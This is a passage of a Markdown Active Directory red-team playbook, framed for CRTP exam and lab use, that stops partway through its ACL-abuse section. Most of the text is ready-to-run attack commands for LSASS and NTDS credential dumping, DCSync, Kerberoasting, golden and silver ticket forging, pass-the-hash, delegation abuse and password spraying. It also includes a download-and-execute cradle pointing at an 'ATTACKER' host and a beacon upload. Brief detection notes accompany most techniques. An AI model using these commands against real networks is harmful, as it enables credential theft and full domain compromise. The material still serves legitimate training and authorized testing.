# Active Directory Red Team Playbook
### Version 1.0 | CRTP / Lab / Interview Reference

> **Scope:** Authorized penetration testing, CRTP exam preparation, and personal lab environments only. All techniques documented here are publicly researched and published by the security community (SpecterOps, harmj0y, Nikhil Mittal, dirkjanm, gentilkiwi, MITRE ATT&CK).

---

## Table of Contents

1. [Lab Setup & Prerequisites](#1-lab-setup--prerequisites)
2. [Reconnaissance & Enumeration](#2-reconnaissance--enumeration)
3. [Credential Harvesting](#3-credential-harvesting)
4. [Kerberos Attack Chain](#4-kerberos-attack-chain)
5. [Lateral Movement](#5-lateral-movement)
6. [ACL / DACL Abuse](#6-acl--dacl-abuse)
7. [Domain Privilege Escalation](#7-domain-privilege-escalation)
8. [Domain Persistence](#8-domain-persistence)
9. [NTLM Relay & Coercion Attacks](#9-ntlm-relay--coercion-attacks)
10. [Forest & Trust Attacks](#10-forest--trust-attacks)
11. [OPSEC & Evasion](#11-opsec--evasion)
12. [Defense & Detection Awareness](#12-defense--detection-awareness)
13. [CRTP Exam Playbook](#13-crtp-exam-playbook)
14. [Red Team Interview Prep](#14-red-team-interview-prep)
15. [Tool Reference Appendix](#15-tool-reference-appendix)

---

## 1. Lab Setup & Prerequisites

### 1.1 Recommended Lab Topology

```
[Attacker] Kali/Parrot (192.168.x.10)
    |
[DC01]    Windows Server 2019/2022 — Domain Controller (192.168.x.100)
[DC02]    Windows Server 2019 — Child Domain DC (optional)
[SRV01]   Windows Server 2019 — Member Server (192.168.x.101)
[WS01]    Windows 10/11 — Domain Workstation (192.168.x.110)
[WS02]    Windows 10/11 — Domain Workstation (192.168.x.111)
```

Minimum viable lab: 1 DC + 1 workstation + 1 Kali attacker VM. For CRTP-relevant trust attacks: 2 domains minimum.

### 1.2 Required Tooling

**Attacker (Kali/Linux):**
```bash
# Impacket suite
pip3 install impacket
# or: git clone https://github.com/fortra/impacket && pip3 install .

# CrackMapExec / NetExec
pip3 install crackmapexec
# Modern fork: pipx install netexec

# BloodHound (CE or legacy)
# CE: docker compose up -d  (BloodHound Community Edition)
# Legacy: sudo apt install bloodhound

# Responder
git clone https://github.com/lgandx/Responder

# mitm6
pip3 install mitm6

# PetitPotam
git clone https://github.com/topotam/PetitPotam

# Kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
```

**Windows Attacker / Compromised Host:**
```
PowerView.ps1       — https://github.com/PowerShellMafia/PowerSploit
Rubeus.exe          — https://github.com/GhostPack/Rubeus
Mimikatz.exe        — https://github.com/gentilkiwi/mimikatz
SharpHound.exe      — https://github.com/SpecterOps/SharpHound
Whisker.exe         — https://github.com/eladshamir/Whisker
evil-winrm          — gem install evil-winrm
```

### 1.3 Lab AD Configuration Checklist

- [ ] Create domain: `corp.local`
- [ ] Add domain users including a service account with an SPN set
- [ ] Add a user with "Do not require Kerberos preauthentication" enabled
- [ ] Create a second domain for trust attack practice
- [ ] Set at least one machine with unconstrained delegation
- [ ] Set at least one service account with constrained delegation
- [ ] Create a GPO linked to an OU
- [ ] Disable SMB signing on one member server (for relay testing)

---

## 2. Reconnaissance & Enumeration

### 2.1 LDAP Enumeration

**MITRE ATT&CK:** T1018, T1069.002, T1087.002

**Prerequisites:** Domain user credentials (low-privileged)

**ldapsearch — anonymous bind check:**
```bash
ldapsearch -x -H ldap://192.168.1.100 -s base namingcontexts
```

**ldapsearch — enumerate all users:**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName userPrincipalName memberOf
```

**ldapsearch — find AS-REP roastable accounts:**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```
> UAC flag `4194304` = `DONT_REQUIRE_PREAUTH`

**ldapsearch — find admin-tier accounts (adminCount=1):**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(adminCount=1))" sAMAccountName distinguishedName
```
> `adminCount=1` means the account is or was under SDProp protection — high-value target.

**ldapsearch — nested group membership (LDAP_MATCHING_RULE_IN_CHAIN):**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(member:1.2.840.113556.1.4.1941:=CN=jsmith,CN=Users,DC=corp,DC=local)" sAMAccountName
```
> The OID `:1.2.840.113556.1.4.1941:` performs recursive membership resolution — finds all groups a user belongs to transitively.

**ldapsearch — search description fields for stored credentials:**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(description=*))" sAMAccountName description
```
> Administrators frequently store passwords in description fields. Easy win.

**ldapsearch — find Kerberoastable accounts (SPN set):**
```bash
ldapsearch -x -H ldap://192.168.1.100 \
  -D "corp\lowprivuser" -w 'Password1' \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**PowerView — Domain Enumeration (load first):**
```powershell
# Load PowerView (bypass execution policy + in-memory)
powershell -ep bypass
. .\PowerView.ps1
# Or from memory:
iex (iwr http://ATTACKER/PowerView.ps1 -UseBasicParsing)

# Domain info
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser                             # all users
Get-DomainUser -SPN                        # Kerberoastable users
Get-DomainUser -UACFilter DONT_REQ_PREAUTH # AS-REP roastable
Get-DomainUser -Properties samaccountname,memberof,description

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# Computer enumeration
Get-DomainComputer -Properties name,operatingsystem,dnshostname
Get-DomainComputer -Unconstrained          # unconstrained delegation hosts
Get-DomainComputer -TrustedToAuth          # constrained delegation hosts

# Trust enumeration
Get-DomainTrust
Get-ForestTrust

# Find local admin access from current context
Find-LocalAdminAccess                      # SLOW — tests each host
Find-LocalAdminAccess -Verbose

# Session enumeration (who's logged in where)
Find-DomainUserLocation                    # finds where DA is logged in
Get-NetLoggedon -ComputerName DC01
Get-NetSession -ComputerName WS01
```

**Expected output:** User list, group membership, computer accounts, SPN/delegation data, trust relationships.

**Detection:** Event ID **4661** (object access), **4624** (logon), LDAP query logging in AD DS auditing.

---

### 2.2 BloodHound / SharpHound Collection

**MITRE ATT&CK:** T1482, T1069.002, T1087.002

**Prerequisites:** Domain user credentials (low-privileged)

**SharpHound collection methods:**
```powershell
# Full collection (most data, most noisy)
.\SharpHound.exe -c All --outputdirectory C:\Temp\bh

# DC-only collection (faster, less noisy, no session data)
.\SharpHound.exe -c DCOnly --outputdirectory C:\Temp\bh

# Session collection (who is logged in where)
.\SharpHound.exe -c Session --outputdirectory C:\Temp\bh

# Stealth collection — lower frequency, randomized delay
.\SharpHound.exe -c All --stealth --randomfilenames --outputdirectory C:\Temp\bh

# Specific domain
.\SharpHound.exe -c All -d corp.local --outputdirectory C:\Temp\bh

# With explicit credentials (from Linux via bloodhound-python)
bloodhound-python -u lowprivuser -p 'Password1' -ns 192.168.1.100 -d corp.local -c All
```

**Upload to BloodHound:**
1. Start Neo4j: `sudo neo4j start` (legacy) OR `docker compose up` (CE)
2. Open BloodHound → Upload Data → select the `.zip` output
3. Run pre-built queries

**Key BloodHound Queries:**
```cypher
-- Shortest path to Domain Admins from owned nodes
-- (use "Mark as Owned" on compromised accounts, then run)
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- All Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Find paths from Domain Users to DA
MATCH p=allShortestPaths((g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[*1..5]->(target:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- Users with DCSync rights
MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
```

**Detection:** Event ID **4624** (logon type 3 from SharpHound host), **4662** (object access audit), network: LDAP queries with unusual volume from non-admin accounts.

---

### 2.3 CrackMapExec / NetExec SMB Enumeration

**MITRE ATT&CK:** T1135, T1018, T1087.002

**Prerequisites:** Network access; some commands require credentials

```bash
# Host discovery + OS fingerprint (unauthenticated)
cme smb 192.168.1.0/24

# Share enumeration
cme smb 192.168.1.100 -u 'lowprivuser' -p 'Password1' --shares

# Logged-on users (requires admin)
cme smb 192.168.1.100 -u 'lowprivuser' -p 'Password1' --loggedon-users

# Local users
cme smb 192.168.1.100 -u 'lowprivuser' -p 'Password1' --local-users

# Domain users via RID cycling (finds usernames without LDAP)
cme smb 192.168.1.100 -u 'lowprivuser' -p 'Password1' --rid-brute

# Null session enumeration (no creds)
cme smb 192.168.1.100 -u '' -p '' --shares
cme smb 192.168.1.100 -u '' -p '' --users

# SMB signing check (prerequisite for NTLM relay)
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

**Detection:** Event ID **4624** (logon type 3), **4776** (NTLM auth), **7045** (service install for psexec-style).

---

### 2.4 DNS Enumeration

**MITRE ATT&CK:** T1590.002

```bash
# Zone transfer attempt
dig axfr @192.168.1.100 corp.local
dnsrecon -d corp.local -t axfr

# Reverse lookup sweep
dnsrecon -d corp.local -t rvl -r 192.168.1.0/24

# General DNS recon
dnsenum corp.local --dnsserver 192.168.1.100

# Internal name resolution from compromised host
nslookup -type=SRV _ldap._tcp.corp.local 192.168.1.100
nslookup -type=SRV _kerberos._tcp.corp.local 192.168.1.100
```

**Detection:** DNS debug logging, high-volume PTR query anomalies.

---

### 2.5 Service Account Discovery

**Prerequisites:** Domain user

```powershell
# PowerView — find all SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# setspn (built-in)
setspn -T corp.local -Q */*

# Rubeus — SPN enumeration only
.\Rubeus.exe kerberoast /stats          # statistics on SPN accounts
.\Rubeus.exe kerberoast /tgtdeleg /stats # count only, no hashes
```

---

## 3. Credential Harvesting

### 3.1 LSASS Credential Dumping

**MITRE ATT&CK:** T1003.001

**Prerequisites:** Local administrator or SYSTEM on target

**Mimikatz — interactive dump:**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # NTLM hashes + plaintext (if WDigest enabled)
mimikatz # sekurlsa::wdigest            # force WDigest (requires reg key on modern Windows)
```

**Mimikatz — targeted NTLM only (quieter):**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::msv               # MSV hashes only
```

**procdump + offline Mimikatz (OPSEC-friendly):**
```cmd
# On target — dump LSASS to file
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# On attacker — parse offline
mimikatz # sekurlsa::minidump C:\Temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**comsvcs.dll MiniDump (LOLBas — no tools needed):**
```powershell
# Get LSASS PID
$lsasspid = (Get-Process lsass).Id

# Dump via comsvcs.dll (requires SYSTEM or SeDebugPrivilege)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsasspid C:\Temp\lsass.dmp full
```

**Enable WDigest for plaintext (requires reboot / new logon):**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

**Detection:** Event ID **4656** (handle request to lsass), **10** (Sysmon: process access on lsass.exe), Defender alert on `sekurlsa`.

---

### 3.2 SAM Database Extraction

**MITRE ATT&CK:** T1003.002

**Prerequisites:** Local administrator

```cmd
# Save SAM and SYSTEM hive to disk
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save

# Transfer to attacker and parse with Impacket
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**Detection:** Event ID **4663** (registry object access on SAM hive).

---

### 3.3 NTDS.dit Extraction

**MITRE ATT&CK:** T1003.003

**Prerequisites:** Domain Admin (or equivalent) on DC

**Method 1 — ntdsutil IFM:**
```cmd
ntdsutil "ac in ntds" "ifm" "create full C:\Temp\ntds" quit quit
```
> Creates `ntds.dit` + `SYSTEM` registry hive in `C:\Temp\ntds\`

**Method 2 — VSS shadow copy:**
```cmd
vssadmin create shadow /for=C:
# Note the shadow copy path, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
robocopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ C:\Temp\ntds ntds.dit
reg save HKLM\SYSTEM C:\Temp\ntds\system.save
```

**Parse with Impacket:**
```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
# Or with domain creds (remote DCSync-style):
impacket-secretsdump corp.local/admin:'Password1'@192.168.1.100
```

**DCSync (preferred — no file required, just rights):**
```
# Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Impacket (remote)
impacket-secretsdump -just-dc corp.local/admin:'Password1'@192.168.1.100
```

**Detection:** Event ID **4662** with GUID `{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (DS-Replication-Get-Changes), Sysmon Event 1 on `ntdsutil.exe`.

---

### 3.4 Kerberoasting

**MITRE ATT&CK:** T1558.003

**Prerequisites:** Any domain user

**Rubeus — request all Kerberoastable hashes:**
```powershell
# Request and save all SPN hashes
.\Rubeus.exe kerberoast /outfile:C:\Temp\kerberoast.txt

# Request specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:C:\Temp\kerberoast.txt

# Force RC4 downgrade (easier to crack — use if AES only)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:C:\Temp\kerberoast.txt
```

**Impacket (from Linux):**
```bash
impacket-GetUserSPNs corp.local/lowprivuser:'Password1' -dc-ip 192.168.1.100 -request -outputfile kerberoast.txt
```

**PowerView:**
```powershell
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File kerberoast.txt
```

**Crack with Hashcat:**
```bash
# Mode 13100 = Kerberos TGS-REP RC4
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force

# Mode 19600 = Kerberos TGS-REP AES128
# Mode 19700 = Kerberos TGS-REP AES256
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

> **RC4 vs AES256:** RC4 (etype 23) is far faster to crack. Modern DCs default AES256 (etype 18). Force RC4 downgrade with `/tgtdeleg` or `/rc4opsec` if the account supports it.

**Detection:** Event ID **4769** (Kerberos service ticket request) with Ticket Encryption Type `0x17` (RC4) — anomalous when account normally uses AES.

---

### 3.5 AS-REP Roasting

**MITRE ATT&CK:** T1558.004

**Prerequisites:** Network access to DC (no credentials required if account has pre-auth disabled)

**Rubeus:**
```powershell
# All AS-REP roastable accounts
.\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep.txt

# Specific user
.\Rubeus.exe asreproast /user:nopreauth_user /format:hashcat
```

**Impacket (no creds needed if you know the username):**
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 192.168.1.100
# With creds (to enumerate which accounts are vulnerable)
impacket-GetNPUsers corp.local/lowprivuser:'Password1' -request -format hashcat -outputfile asrep.txt -dc-ip 192.168.1.100
```

**Crack with Hashcat:**
```bash
# Mode 18200 = Kerberos AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

**Detection:** Event ID **4768** (AS-REQ with pre-auth disabled), unusual AS-REQ traffic from non-domain-joined hosts.

---

### 3.6 Password Spraying

**MITRE ATT&CK:** T1110.003

**Prerequisites:** Network access; knowledge of domain lockout policy (critical — check first)

**Check lockout policy before spraying:**
```powershell
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
# Or: net accounts /domain
```

**Kerbrute (Kerberos-based, no LDAP lockout trigger):**
```bash
./kerbrute passwordspray -d corp.local --dc 192.168.1.100 users.txt 'Password1!'
```

**CrackMapExec:**
```bash
cme smb 192.168.1.100 -u users.txt -p 'Password1!' --no-bruteforce --continue-on-success
```

**DomainPasswordSpray (PowerShell):**
```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password1!' -OutFile spray_results.txt
```

> **Spraying discipline:** One password per spray round. Wait at least 30 minutes between rounds (or observe the observation window). Never exceed `lockoutThreshold - 1` attempts per window.

**Detection:** Event ID **4625** (failed logon) — spike across many accounts with same timestamp pattern.

---

### 3.7 LSA Secrets & Cached Credentials

**MITRE ATT&CK:** T1003.004, T1003.005

**Prerequisites:** SYSTEM on the target

**Mimikatz:**
```
mimikatz # privilege::debug
mimikatz # lsadump::secrets     # service account passwords stored as LSA secrets
mimikatz # lsadump::cache       # Domain Cached Credentials (DCC2/MSCachev2)
```

**Impacket (remote):**
```bash
impacket-secretsdump corp.local/admin:'Password1'@192.168.1.100
# Shows: [*] Dumping LSA Secrets, [*] Dumping cached domain logon information
```

**Crack DCC2 hashes (slow — no rainbow tables):**
```bash
# Mode 2100 = DCC2 (MSCachev2)
hashcat -m 2100 cached_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 4. Kerberos Attack Chain

### 4.1 Pass-the-Ticket (PtT)

**MITRE ATT&CK:** T1550.003

**Prerequisites:** NTLM hash or existing `.kirbi` ticket

```powershell
# Import ticket into current session
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Verify loaded tickets
.\Rubeus.exe triage
klist

# Convert ccache (Linux) to kirbi (Windows)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

### 4.2 Overpass-the-Hash (Pass-the-Key)

**MITRE ATT&CK:** T1550.002

**Prerequisites:** NTLM hash or AES key of target user

```
# Mimikatz — spawn process with hash
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd.exe

# Rubeus — request TGT using hash
.\Rubeus.exe asktgt /user:administrator /rc4:HASH /domain:corp.local /ptt

# Rubeus — with AES256 key (less detectable)
.\Rubeus.exe asktgt /user:administrator /aes256:KEY /domain:corp.local /ptt /opsec
```

---

### 4.3 Golden Ticket

**MITRE ATT&CK:** T1558.001

**Prerequisites:** `krbtgt` NTLM hash + Domain SID (requires DA or DCSync rights)

**Step 1 — Get krbtgt hash:**
```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
# Note: Hash NTLM value
```

**Step 2 — Get Domain SID:**
```powershell
Get-DomainSID   # PowerView
# Or: whoami /user (then strip last RID)
```

**Step 3 — Forge Golden Ticket:**
```
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:HASH /user:FakeAdmin /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

**Parameters explained:**
- `/user:` — any username (doesn't need to exist)
- `/id:500` — RID 500 = built-in Administrator
- `/groups:512` — Domain Admins group
- `/ptt` — inject into current session immediately
- For 10-year ticket: `/endin:52560000`

**Step 4 — Verify:**
```
klist
dir \\DC01\C$   # should succeed
```

**Detection:** Event ID **4769** with unusual ticket lifetime (>7 days), Event **4672** (special privileges), Ticket Encryption Type mismatch (RC4 when domain uses AES).

---

### 4.4 Silver Ticket

**MITRE ATT&CK:** T1558.002

**Prerequisites:** NTLM hash of the service account (not krbtgt)

```
mimikatz # kerberos::silver /domain:corp.local /sid:S-1-5-21-XXXX /target:SRV01.corp.local /service:cifs /rc4:SERVICE_HASH /user:FakeAdmin /id:500 /groups:512 /ptt
```

**Common service targets:**
| Service | SPN prefix | Access gained |
|---------|-----------|---------------|
| cifs | cifs/ | File share (C$, ADMIN$) |
| host | host/ | Task Scheduler, WMI |
| http | http/ | IIS, WinRM |
| rpcss | rpcss/ | WMI via RPC |
| wsman | wsman/ | PowerShell Remoting |
| mssql | MSSQLSvc/ | SQL Server |

> **Key difference from Golden:** Silver Ticket never touches the DC — bypasses DC-side logging entirely. Only the target service can validate it.

**Detection:** No DC Event ID fires. Only service-side logs. Anomaly: ticket Ticket Granting Ticket field is missing in Kerberos traffic capture (no TGS-REQ to DC).

---

### 4.5 Unconstrained Delegation Abuse

**MITRE ATT&CK:** T1558.001 (combined with coercion)

**Prerequisites:** Code execution on a host with unconstrained delegation set

**Find hosts with unconstrained delegation:**
```powershell
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname
```

**Monitor for TGTs on the delegation host:**
```powershell
# Rubeus — monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Alternative
.\Rubeus.exe dump /service:krbtgt /nowrap
```

**Coerce a DC to authenticate to the delegation host (PrinterBug):**
```bash
# From attacker (or from delegation host itself)
python3 SpoolSample.py DC01.corp.local delhost.corp.local
# When DC authenticates, TGT is cached on delhost
```

**Extract and use the TGT:**
```powershell
# On delhost (after coercion)
.\Rubeus.exe dump /luid:0xABCDE /nowrap
# Convert base64 kirbi and PTT:
.\Rubeus.exe ptt /ticket:doIFxj...base64...
```

**Detection:** Event ID **4768** (TGT request), Sysmon network connection from DC to delegation host on TCP 445.

---

### 4.6 Constrained Delegation Abuse

**MITRE ATT&CK:** T1558.001

**Prerequisites:** NTLM hash or TGT of the service account configured with constrained delegation

**Find accounts with constrained delegation:**
```powershell
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
```

**S4U2Self + S4U2Proxy abuse:**
```powershell
# Request TGT for the delegation account (using its hash)
.\Rubeus.exe asktgt /user:svc_iis /rc4:HASH /domain:corp.local /nowrap

# Use S4U to impersonate any user to the allowed service
.\Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:administrator /msdsspn:"cifs/SRV01.corp.local" /ptt
```

**From Linux:**
```bash
impacket-getST -spn cifs/SRV01.corp.local -impersonate administrator corp.local/svc_iis -hashes :NTLM_HASH -dc-ip 192.168.1.100
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass SRV01.corp.local
```

**Detection:** Event ID **4769** (TGS request) with S4U extensions, unusual service ticket requests on behalf of other users.

---

### 4.7 Resource-Based Constrained Delegation (RBCD)

**MITRE ATT&CK:** T1187

**Prerequisites:** `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteProperty` on a computer object

**Step 1 — Create a fake computer account (or use existing machine account):**
```powershell
# Add new computer account (domain users can add up to 10 by default)
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'FakePassword1!' -AsPlainText -Force) -Verbose
```

**Step 2 — Set msDS-AllowedToActOnBehalfOfOtherIdentity on target:**
```powershell
$FakePCSID = Get-DomainComputer FakePC -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($FakePCSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

**Step 3 — S4U abuse to impersonate Administrator:**
```powershell
.\Rubeus.exe s4u /user:FakePC$ /rc4:FAKEPC_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt
```

**Detection:** Event ID **5136** (computer object attribute modification — `msDS-AllowedToActOnBehalfOfOtherIdentity`).

---

## 5. Lateral Movement

### 5.1 Pass-the-Hash

**MITRE ATT&CK:** T1550.002

**Prerequisites:** NTLM hash, target must accept PTH (disabled in newer Windows with Credential Guard)

**Impacket suite:**
```bash
# Interactive shell via WMI (quieter)
impacket-wmiexec corp.local/administrator@192.168.1.101 -hashes :NTLM_HASH

# psexec-style (creates service — noisy)
impacket-psexec corp.local/administrator@192.168.1.101 -hashes :NTLM_HASH

# smbexec (service-based, but no binary drop)
impacket-smbexec corp.local/administrator@192.168.1.101 -hashes :NTLM_HASH

# Validate access across network
cme smb 192.168.1.0/24 -u administrator -H NTLM_HASH --local-auth
```

**Mimikatz PTH:**
```
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:"cmd.exe"
```

**Detection:** Event ID **4624** Logon Type 3 with NTLM auth (not Kerberos), **4625** for failures.

---

### 5.2 WMI Lateral Movement

**MITRE ATT&CK:** T1047

```powershell
# Remote command execution via WMI
Invoke-WmiMethod -ComputerName SRV01.corp.local -Class win32_process -Name create -ArgumentList "powershell.exe -c whoami > C:\Temp\out.txt" -Credential (Get-Credential)

# wmic (built-in)
wmic /node:SRV01.corp.local /user:corp\administrator /password:Password1 process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

**Detection:** Event ID **4688** (process creation), **WMI-Activity/Operational** log Event **23**, Sysmon Event 1+3.

---

### 5.3 WinRM / PSRemoting

**MITRE ATT&CK:** T1021.006

```powershell
# Interactive session
Enter-PSSession -ComputerName SRV01.corp.local -Credential corp\administrator

# Execute command remotely
Invoke-Command -ComputerName SRV01.corp.local -ScriptBlock { whoami; hostname } -Credential corp\administrator

# evil-winrm (attacker Linux tool)
evil-winrm -i 192.168.1.101 -u administrator -p 'Password1'
evil-winrm -i 192.168.1.101 -u administrator -H NTLM_HASH
```

**Detection:** Event ID **4624** Logon Type 3, **Microsoft-Windows-WinRM/Operational** Event **91**, port 5985/5986.

---

### 5.4 DCOM Lateral Movement

**MITRE ATT&CK:** T1021.003

```powershell
# MMC20.Application — classic DCOM LM
$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application","SRV01.corp.local"))
$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\cmd.exe",$null,"/c whoami > C:\Temp\out.txt","7")

# ShellBrowserWindow
$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([Guid]'C08AFD90-F2A1-11D1-8455-00A0C91F3880',"SRV01.corp.local"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\Temp\out.txt","C:\Windows\System32",$null,0)
```

**Detection:** Event ID **4688** (process created under `svchost.exe`), DCOM network activity on port 135+dynamic RPC.

---

### 5.5 SMB Lateral Movement

```bash
# CrackMapExec execution methods
cme smb 192.168.1.101 -u administrator -p 'Password1' -x "whoami"          # cmd
cme smb 192.168.1.101 -u administrator -p 'Password1' -X "Get-Process"     # PowerShell
cme smb 192.168.1.101 -u administrator -p 'Password1' --exec-method wmiexec -x "whoami"

# File upload and execute
cme smb 192.168.1.101 -u administrator -p 'Password1' --put-file ./beacon.exe \\\\192.168.1.101\\C$\\Temp\\beacon.exe
```

---

## 6. ACL / DACL Abuse

> Reference: harmj0y "An ACE Up the Sleeve" (2017), Will Schroeder & Andy Robbins — SpecterOps

### 6.1 Identifying Abusable ACLs

```powershell
# Find all ACLs for current user or group membership
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "lowprivuser"}

# ACLs on a specific object
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}

# Via BloodHound — most efficient
# Look for edges: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember
```

---

### 6.2 GenericAll on User

```powershell
# Option 1: Reset password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Verbose

# Option 2: Targeted Kerberoast (set SPN, request TGS, remove SPN)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'} -Verbose
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted_roast.txt
Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose
```

---

### 6.3 GenericAll on Group

```powershell
# Add self to group
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'lowprivuser' -Verbose

# Verify
Get-DomainGroupMember 'Domain Admins'
```

---

### 6.4 WriteDACL Abuse → DCSync Rights

```powershell
# Grant current user DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
Add-ObjectAcl -TargetDistinguishedName "DC=corp,DC=local" -PrincipalSamAccountName lowprivuser -Rights DCSync -Verbose

# Verify
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "lowprivuser"}

# Execute DCSync
mimikatz # lsadump::dcsync /domain:corp.local /user:administrator
```

---

### 6.5 WriteOwner Abuse

```powershell
# Take ownership of object
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity lowprivuser -Verbose

# Grant self GenericAll (now that we own it)
Add-ObjectAcl -TargetSamAccountName targetobject -PrincipalSamAccountName lowprivuser -Rights All -Verbose
```

---

### 6.6 ForceChangePassword

```powershell
# Via PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Credential $cred -Verbose

# Via net rpc (from Linux)
net rpc password targetuser 'NewPass1!' -U corp/lowprivuser%Password1 -S 192.168.1.100
```

---

### 6.7 Shadow Credentials Attack

**MITRE ATT&CK:** T1556.006 (modify authentication)

**Prerequisites:** `GenericWrite` or `GenericAll` on the target computer or user object

```powershell
# Whisker (Windows)
.\Whisker.exe add /target:targetcomputer$ /domain:corp.local /dc:DC01.corp.local /path:C:\Temp\cert.pfx /password:CertPass1

# pywhisker (Linux)
